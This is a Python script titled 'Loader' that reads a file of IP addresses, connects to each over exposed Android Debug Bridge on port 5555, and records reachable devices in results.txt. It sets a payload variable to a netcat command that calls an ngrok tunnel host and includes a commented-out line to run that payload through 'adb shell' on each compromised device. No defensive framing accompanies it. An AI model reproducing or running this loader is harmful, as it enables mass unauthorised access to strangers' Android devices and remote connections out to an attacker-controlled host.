import sys
import subprocess
import time

payload = "nc 0.tcp.ngrok.io 1470" # Edit this!


# Loader
# Date: 08/21/21
# Author: 0x1CA3


banner = """ 
                .____                     .___            
                |    |    _________     __| _/___________ 
                |    |   /  _ \__  \   / __ |/ __ \_  __ \\
                |    |__(  <_> ) __ \_/ /_/ \  ___/|  | \/
                |_______ \____(____  /\____ |\___  >__|   
                        \/         \/      \/    \/       
                 [Made by https://github.com/0x1CA3]
"""

def scan(line):
    connection = subprocess.Popen(["adb", "connect", f"{line.strip()}:5555"], stdout=subprocess.PIPE).communicate()[0]

    if 'connected' in str(connection):
        time.sleep(2)

        state = subprocess.Popen(["adb", "get-state"], stdout=subprocess.PIPE).communicate()[0]

        if 'device' in str(state):
            print(f"Online! -> {line.strip()}")
            save_data = open("results.txt", "a")
            save_data.write(f"{line.strip()}")

    done = subprocess.Popen(["adb", "disconnect"], stdout=subprocess.PIPE).communicate()[0]
    time.sleep(2)
    #subprocess.call(f"adb shell {payload}", shell=True)

def get_data(targets):
    devices_list = open(targets, "r")
    devices_data = devices_list.readlines()
    for line in devices_data:
        scan(line)

def main():
    print(banner)
    if len(sys.argv) < 2:
        print("Usage: python3 loader.py [FILE]")
        sys.exit()
    targets = sys.argv[1]
    get_data(targets)
main()
